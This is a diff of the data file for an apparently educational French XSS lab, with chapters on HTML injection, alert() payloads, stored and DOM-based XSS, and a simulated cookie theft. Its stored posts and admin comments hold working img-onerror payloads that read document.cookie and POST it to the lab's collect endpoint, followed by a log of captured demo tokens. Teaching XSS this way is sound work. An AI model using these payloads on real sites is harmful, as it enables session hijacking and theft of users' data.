@@ -4,153 +4,330 @@
       "id": "chapter1",
       "title": "Chapitre 1 : Introduction - Injection HTML basique",
       "order": 1,
-      "content": "\n<h3>Objectif</h3>\n<p>Comprendre comment l'injection HTML fonctionne et ses limites.</p>\n\n<h3>Concept</h3>\n<p>L'injection HTML permet d'inserer du code HTML dans une page web. Ce n'est pas encore du JavaScript, mais c'est la premiere etape.</p>\n\n<h3>Exemples a tester</h3>\n<ul>\n  <li><code>&lt;strong&gt;Texte en gras&lt;/strong&gt;</code></li>\n  <li><code>&lt;i&gt;Texte en italique&lt;/i&gt;</code></li>\n  <li><code>&lt;h1&gt;Grand titre&lt;/h1&gt;</code></li>\n</ul>\n\n<h3>Exercice</h3>\n<p>Essayez d'injecter du HTML dans le champ ci-dessous et observez le resultat.</p>\n        ",
+      "content": "\n<h3>Objectif</h3>\n<p>Comprendre comment l'injection HTML fonctionne et ses limites.</p>\n\n<h3>Concept</h3>\n<p>L'injection HTML permet d'insérer du code HTML dans une page web. Ce n'est pas encore du JavaScript, mais c'est la première étape.</p>\n\n<h3>Exemples à tester</h3>\n<ul>\n  <li><code>&lt;strong&gt;Texte en gras&lt;/strong&gt;</code></li>\n  <li><code>&lt;i&gt;Texte en italique&lt;/i&gt;</code></li>\n  <li><code>&lt;h1&gt;Grand titre&lt;/h1&gt;</code></li>\n  <li><code>&lt;img src=\"https://via.placeholder.com/150\" /&gt;</code></li>\n</ul>\n\n<h3>Exercice</h3>\n<p>Essayez d'injecter du HTML dans le champ ci-dessous et observez le résultat.</p>\n        ",
       "instructions": "Postez un message avec du HTML et observez comment il est rendu."
     },
     {
       "id": "chapter2",
       "title": "Chapitre 2 : XSS simple avec alert()",
       "order": 2,
-      "content": "\n<h3>Objectif</h3>\n<p>Executer du JavaScript dans le navigateur via une faille XSS.</p>\n\n<h3>Concept</h3>\n<p>Le Cross-Site Scripting (XSS) permet d'executer du code JavaScript arbitraire dans le navigateur de la victime.</p>\n\n<h3>Payloads classiques</h3>\n<ul>\n  <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>\n  <li><code>&lt;img src=x onerror=\"alert('XSS')\"&gt;</code></li>\n</ul>\n\n<h3>Exercice</h3>\n<p>Essayez de declencher une alerte JavaScript dans votre navigateur.</p>\n        ",
-      "instructions": "Utilisez un des payloads ci-dessus pour declencher une alerte."
+      "content": "\n<h3>Objectif</h3>\n<p>Exécuter du JavaScript dans le navigateur via une faille XSS.</p>\n\n<h3>Concept</h3>\n<p>Le Cross-Site Scripting (XSS) permet d'exécuter du code JavaScript arbitraire dans le navigateur de la victime.</p>\n\n<h3>Payloads classiques</h3>\n<ul>\n  <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>\n  <li><code>&lt;img src=x onerror=\"alert('XSS')\" /&gt;</code></li>\n  <li><code>&lt;svg onload=\"alert('XSS')\"&gt;&lt;/svg&gt;</code></li>\n  <li><code>&lt;body onload=\"alert('XSS')\"&gt;</code></li>\n</ul>\n\n<h3>Exercice</h3>\n<p>Essayez de déclencher une alerte JavaScript dans votre navigateur.</p>\n        ",
+      "instructions": "Utilisez un des payloads ci-dessus pour déclencher une alerte."
     },
     {
       "id": "chapter3",
-      "title": "Chapitre 3 : XSS stocke (Stored XSS)",
+      "title": "Chapitre 3 : XSS stocké (Stored XSS)",
       "order": 3,
-      "content": "\n<h3>Objectif</h3>\n<p>Comprendre la difference entre XSS reflechi et XSS stocke.</p>\n\n<h3>Concept</h3>\n<p>Un XSS stocke (ou persistant) est sauvegarde dans la base de donnees et execute chaque fois qu'un utilisateur visite la page.</p>\n\n<h3>Danger</h3>\n<p>C'est le type de XSS le plus dangereux car il affecte tous les utilisateurs qui visitent la page, pas seulement celui qui a clique sur un lien malveillant.</p>\n\n<h3>Exercice</h3>\n<p>Postez un message avec du JavaScript. Rechargez la page. Le script s'execute-t-il a nouveau ?</p>\n        ",
-      "instructions": "Postez un payload XSS et observez s'il persiste apres rechargement."
+      "content": "\n<h3>Objectif</h3>\n<p>Comprendre la différence entre XSS réfléchi et XSS stocké.</p>\n\n<h3>Concept</h3>\n<p>Un XSS stocké (ou persistant) est sauvegardé dans la base de données et exécuté chaque fois qu'un utilisateur visite la page.</p>\n\n<h3>Danger</h3>\n<p>C'est le type de XSS le plus dangereux car il affecte tous les utilisateurs qui visitent la page, pas seulement celui qui a cliqué sur un lien malveillant.</p>\n\n<h3>Exercice</h3>\n<p>Postez un message avec du JavaScript. Rechargez la page. Le script s'exécute-t-il à nouveau ?</p>\n        ",
+      "instructions": "Postez un payload XSS et observez s'il persiste après rechargement."
     },
     {
       "id": "chapter4",
-      "title": "Chapitre 4 : Consequences d'une attaque XSS",
+      "title": "Chapitre 4 : Exfiltration de données (simulation)",
       "order": 4,
-      "content": "\n<h3>Objectif</h3>\n<p>Comprendre les risques reels d'une faille XSS.</p>\n\n<h3>Risques potentiels</h3>\n<ul>\n  <li><strong>Vol de session :</strong> Un attaquant peut voler les cookies de session</li>\n  <li><strong>Phishing :</strong> Affichage de faux formulaires de connexion</li>\n  <li><strong>Defacement :</strong> Modification du contenu de la page</li>\n  <li><strong>Keylogging :</strong> Capture des saisies clavier</li>\n  <li><strong>Propagation :</strong> Creation de vers XSS</li>\n</ul>\n\n<h3>Note pedagogique</h3>\n<p>Dans cette demo, nous utilisons un <code>demoToken</code> pour simuler un cookie de session. Aucune donnee reelle n'est collectee.</p>\n\n<h3>Exercice</h3>\n<p>Reflechissez aux consequences possibles si un attaquant pouvait executer du JavaScript sur un site de banque ou de commerce.</p>\n        ",
-      "instructions": "Comprendre les risques et reflechir aux consequences."
+      "content": "\n<h3>Objectif</h3>\n<p>Comprendre comment un attaquant pourrait voler des données via XSS.</p>\n\n<h3>Concept</h3>\n<p>Un attaquant peut utiliser XSS pour exfiltrer des informations comme les cookies de session, les tokens, ou d'autres données sensibles.</p>\n\n<h3>Comment ça fonctionne ?</h3>\n<ol>\n  <li>L'attaquant injecte un script XSS dans la page.</li>\n  <li>Le script lit les cookies via <code>document.cookie</code>.</li>\n  <li>Il envoie ces données à un serveur contrôlé par l'attaquant (via <code>fetch()</code> ou une balise <code>&lt;img&gt;</code>).</li>\n  <li>L'attaquant reçoit le cookie de session et peut usurper l'identité de la victime.</li>\n</ol>\n\n<h3>Ce que contient <code>document.cookie</code></h3>\n<p>Dans cette app, vos cookies contiennent : <code>demoToken</code>, <code>userName</code> et <code>userPassword</code>. En situation réelle, on y trouve souvent le cookie de session (<code>SESSIONID</code>).</p>\n\n<h3>Exercice</h3>\n<p>En utilisant ce que vous avez appris aux chapitres précédents, essayez de construire un payload qui affiche le contenu de <code>document.cookie</code> dans une alerte. C'est la première étape d'une exfiltration.</p>\n<p><strong>Indice :</strong> combinez une balise <code>&lt;img onerror&gt;</code> et <code>alert(document.cookie)</code>.</p>\n\n<p class=\"alert alert-warning mt-md\"><strong>⚠️ AVERTISSEMENT :</strong> En situation réelle, ces techniques permettent de voler des sessions actives. Ne JAMAIS les utiliser sur de vraies applications sans autorisation !</p>\n        ",
+      "instructions": "Construisez vous-même un payload qui affiche document.cookie dans une alerte."
     },
     {
       "id": "chapter5",
-      "title": "Chapitre 5 : Defenses contre XSS",
+      "title": "Chapitre 5 : DOM-based XSS",
       "order": 5,
-      "content": "\n<h3>Objectif</h3>\n<p>Apprendre les techniques de protection contre les attaques XSS.</p>\n\n<h3>1. Echappement (Escaping)</h3>\n<p>Convertir les caracteres speciaux HTML en entites :</p>\n<ul>\n  <li><code>&lt;</code> devient <code>&amp;lt;</code></li>\n  <li><code>&gt;</code> devient <code>&amp;gt;</code></li>\n</ul>\n\n<h3>2. Sanitization</h3>\n<p>Utiliser des bibliotheques comme DOMPurify ou sanitize-html.</p>\n\n<h3>3. Content Security Policy (CSP)</h3>\n<p>Definir une politique de securite pour limiter les sources de scripts.</p>\n\n<h3>4. Cookies HttpOnly</h3>\n<p>Empecher l'acces aux cookies via JavaScript.</p>\n\n<h3>Mode SAFE</h3>\n<p>Dans cette app, basculez en mode SAFE pour voir le contenu echappe.</p>\n        ",
-      "instructions": "Comparez le rendu en mode SAFE vs UNSAFE."
+      "content": "\n<h3>Objectif</h3>\n<p>Découvrir une troisième variante de XSS qui ne passe jamais par le serveur.</p>\n\n<h3>Concept</h3>\n<p>Le <strong>DOM-based XSS</strong> se produit entièrement côté client : le navigateur lit une valeur non fiable (paramètre d'URL, hash, referrer) et l'injecte dans le DOM sans la nettoyer. Le serveur ne voit jamais le payload.</p>\n\n<h3>Sources non fiables classiques</h3>\n<ul>\n  <li><code>location.hash</code> — la partie après le <code>#</code> dans l'URL</li>\n  <li><code>location.search</code> — les paramètres après le <code>?</code></li>\n  <li><code>document.referrer</code> — l'URL de la page précédente</li>\n</ul>\n\n<h3>Exemple de code vulnérable</h3>\n<pre><code>// JavaScript côté client uniquement :\nconst query = new URLSearchParams(location.search).get('q');\ndocument.getElementById('titre').innerHTML = 'Résultat : ' + query;</code></pre>\n<p>Un attaquant peut envoyer le lien : <code>http://site.com/search?q=&lt;img src=x onerror=alert(1)&gt;</code></p>\n\n<h3>Différence avec Stored/Reflected XSS</h3>\n<table style=\"width:100%;border-collapse:collapse;font-size:0.875rem\">\n  <tr style=\"background:var(--color-bg-secondary)\">\n    <th style=\"padding:8px;text-align:left\">Type</th><th style=\"padding:8px;text-align:left\">Passe par le serveur ?</th><th style=\"padding:8px;text-align:left\">Stocké ?</th>\n  </tr>\n  <tr><td style=\"padding:8px\">Reflected</td><td style=\"padding:8px\">Oui</td><td style=\"padding:8px\">Non</td></tr>\n  <tr><td style=\"padding:8px\">Stored</td><td style=\"padding:8px\">Oui</td><td style=\"padding:8px\">Oui</td></tr>\n  <tr style=\"background:var(--color-warning-bg)\"><td style=\"padding:8px\"><strong>DOM-based</strong></td><td style=\"padding:8px\"><strong>Non</strong></td><td style=\"padding:8px\">Non</td></tr>\n</table>\n\n<h3>Exercice</h3>\n<p>Le payload ci-dessous s'injecte via l'URL. Postez-le en mode UNSAFE et observez si le JavaScript s'exécute :</p>\n<p><code>&lt;img src=x onerror=\"alert('DOM XSS via img')\"&gt;</code></p>\n<p>Ensuite, activez le <strong>mode SAFE</strong> et repostez : que se passe-t-il ?</p>\n        ",
+      "instructions": "Comparez l'exécution du payload en mode SAFE vs UNSAFE. Observez la différence."
     }
   ],
   "posts": {
-    "chapter1": [
+    "chapter4": [
       {
-        "id": "1770303622082",
-        "content": "<strong>Texte en gras</strong>",
+        "id": "1772661353719",
+        "content": "<img src=x onerror=\"fetch('/api/collect', {\r\n  method: 'POST',\r\n  headers: {'Content-Type': 'application/json'},\r\n  body: JSON.stringify({\r\n    demoToken: document.cookie.match(/demoToken=([^;]+)/)?.[1] || 'NO_TOKEN',\r\n    chapterId: 'chapter4',\r\n    userName: document.cookie.match(/userName=([^;]+)/)?.[1] || 'Unknown'\r\n  })\r\n})\" />",
         "author": "admin",
-        "timestamp": "2026-02-05T15:00:22.082Z",
+        "timestamp": "2026-03-04T21:55:53.719Z",
         "safe": false
       },
       {
-        "id": "1770303635368",
-        "content": "<strong>gras</strong>",
-        "author": "admin",
-        "timestamp": "2026-02-05T15:00:35.369Z",
-        "safe": true
-      }
-    ],
-    "chapter3": [
-      {
-        "id": "1770304016997",
-        "content": "<strong>neuille</strong>",
-        "author": "test",
-        "timestamp": "2026-02-05T15:06:56.997Z",
-        "safe": false
-      }
-    ],
-    "chapter5": [
-      {
-        "id": "1770304091880",
-        "content": "<strong>NEU</strong>",
-        "author": "test",
-        "timestamp": "2026-02-05T15:08:11.880Z",
+        "id": "1772661905353",
+        "content": "<img src=x onerror=\"fetch('/api/collect', {\r\n  method: 'POST',\r\n  headers: {'Content-Type': 'application/json'},\r\n  body: JSON.stringify({\r\n    demoToken: document.cookie.match(/demoToken=([^;]+)/)?.[1] || 'NO_TOKEN',\r\n    chapterId: 'chapter4',\r\n    userName: document.cookie.match(/userName=([^;]+)/)?.[1] || 'Unknown'\r\n  })\r\n})\" />",
+        "author": "toto",
+        "timestamp": "2026-03-04T22:05:05.353Z",
         "safe": false
       }
     ],
     "chapter2": [
       {
-        "id": "1770304388957",
-        "content": "<script>alert('XSS')</script>",
-        "author": "matew",
-        "timestamp": "2026-02-05T15:13:08.957Z",
+        "id": "1772661478548",
+        "content": "test",
+        "author": "toto",
+        "timestamp": "2026-03-04T21:57:58.548Z",
         "safe": false
       },
       {
-        "id": "1770304397157",
-        "content": "<strong>gras</strong",
-        "author": "matew",
-        "timestamp": "2026-02-05T15:13:17.157Z",
+        "id": "1772661858229",
+        "content": "<body onload=\"alert('XSS')\">",
+        "author": "toto",
+        "timestamp": "2026-03-04T22:04:18.229Z",
         "safe": false
-      },
-      {
-        "id": "1770304407709",
-        "content": "<strong>gras</strong>",
-        "author": "matew",
-        "timestamp": "2026-02-05T15:13:27.709Z",
-        "safe": false
-      },
-      {
-        "id": "1770304430877",
-        "content": "v",
-        "author": "matew",
-        "timestamp": "2026-02-05T15:13:50.877Z",
-        "safe": true
       }
-    ]
-  },
-  "comments": {
+    ],
     "chapter1": [
       {
-        "id": "1770304328019",
-        "content": "Hugo il a pas l'argent pour le voyage d'étude",
-        "author": "matew",
-        "timestamp": "2026-02-05T15:12:08.019Z"
-      },
-      {
-        "id": "1770304342253",
-        "content": "<script>alert('XSS')</script>",
-        "author": "matew",
-        "timestamp": "2026-02-05T15:12:22.253Z"
+        "id": "1772661844501",
+        "content": "<strong>Texte en gras</strong>",
+        "author": "toto",
+        "timestamp": "2026-03-04T22:04:04.501Z",
+        "safe": false
       }
     ],
     "chapter3": [
       {
-        "id": "1770304534337",
-        "content": "Explosé",
-        "author": "matew",
-        "timestamp": "2026-02-05T15:15:34.337Z"
+        "id": "1772661885408",
+        "content": "<script>alert('XSS')</script>",
+        "author": "toto",
+        "timestamp": "2026-03-04T22:04:45.408Z",
+        "safe": false
+      }
+    ],
+    "chapter5": [
+      {
+        "id": "1772661971544",
+        "content": "<strong>gras</strong>",
+        "author": "toto",
+        "timestamp": "2026-03-04T22:06:11.544Z",
+        "safe": false
       }
     ]
   },
+  "comments": {},
   "globalAdminComments": [
     {
-      "id": "1770304586705",
-      "content": "<img src=\"x\" onerror=\"fetch('/api/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({demoToken:document.cookie.match(/demoToken=([^;]+)/)?.[1],userName:'test'})})\">",
-      "timestamp": "2026-02-05T15:16:26.705Z"
+      "id": "1772661619618",
+      "content": "<img src=x onerror=\"fetch('/api/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({demoToken:document.cookie.match(/demoToken=([^;]+)/)?.[1]||'NO_TOKEN',userName:document.cookie.match(/userName=([^;]+)/)?.[1]||'Unknown',captureType:'cookie'})})\">",
+      "timestamp": "2026-03-04T22:00:19.618Z"
     }
   ],
   "captures": [
     {
-      "id": "1770304588935",
-      "demoToken": "DEMO-492ubyx4aer",
-      "userName": "test",
+      "id": "1772661629767",
+      "demoToken": "DEMO-wgtxlex7nkg",
+      "userName": "toto",
       "password": null,
-      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Avast/144.0.0.0",
       "captureType": "cookie",
-      "timestamp": "2026-02-05T15:16:28.935Z"
+      "timestamp": "2026-03-04T22:00:29.767Z"
     },
     {
-      "id": "1770304619554",
-      "demoToken": "DEMO-fxqzcmuu8su",
+      "id": "1772661643324",
+      "demoToken": "DEMO-z3fhce9hskp",
+      "userName": "admin",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:00:43.324Z"
+    },
+    {
+      "id": "1772661660560",
+      "demoToken": "DEMO-e9muhg2rkk",
       "userName": "test",
       "password": null,
-      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Avast/144.0.0.0",
       "captureType": "cookie",
-      "timestamp": "2026-02-05T15:16:59.554Z"
+      "timestamp": "2026-03-04T22:01:00.560Z"
+    },
+    {
+      "id": "1772661839572",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:03:59.572Z"
+    },
+    {
+      "id": "1772661844642",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:04:04.642Z"
+    },
+    {
+      "id": "1772661850233",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:04:10.233Z"
+    },
+    {
+      "id": "1772661858337",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:04:18.337Z"
+    },
+    {
+      "id": "1772661859726",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:04:19.726Z"
+    },
+    {
+      "id": "1772661862852",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:04:22.852Z"
+    },
+    {
+      "id": "1772661887178",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:04:47.178Z"
+    },
+    {
+      "id": "1772661890696",
+      "demoToken": "DEMO-za6tktcw47o",
+      "chapterId": "chapter4",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:04:50.696Z"
+    },
+    {
+      "id": "1772661890723",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:04:50.723Z"
+    },
+    {
+      "id": "1772661905501",
+      "demoToken": "DEMO-za6tktcw47o",
+      "chapterId": "chapter4",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:05.501Z"
+    },
+    {
+      "id": "1772661905526",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:05.527Z"
+    },
+    {
+      "id": "1772661905551",
+      "demoToken": "DEMO-za6tktcw47o",
+      "chapterId": "chapter4",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:05.551Z"
+    },
+    {
+      "id": "1772661912282",
+      "demoToken": "DEMO-za6tktcw47o",
+      "chapterId": "chapter4",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:12.282Z"
+    },
+    {
+      "id": "1772661912305",
+      "demoToken": "DEMO-za6tktcw47o",
+      "chapterId": "chapter4",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:12.305Z"
+    },
+    {
+      "id": "1772661912322",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:12.322Z"
+    },
+    {
+      "id": "1772661921327",
+      "demoToken": "DEMO-za6tktcw47o",
+      "chapterId": "chapter4",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:21.327Z"
+    },
+    {
+      "id": "1772661921347",
+      "demoToken": "DEMO-za6tktcw47o",
+      "chapterId": "chapter4",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:21.347Z"
+    },
+    {
+      "id": "1772661921365",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:21.365Z"
+    },
+    {
+      "id": "1772661948580",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:05:48.580Z"
+    },
+    {
+      "id": "1772661971790",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:06:11.790Z"
+    },
+    {
+      "id": "1772662370502",
+      "demoToken": "DEMO-za6tktcw47o",
+      "userName": "toto",
+      "password": null,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+      "captureType": "cookie",
+      "timestamp": "2026-03-04T22:12:50.502Z"
     }
   ]
 }
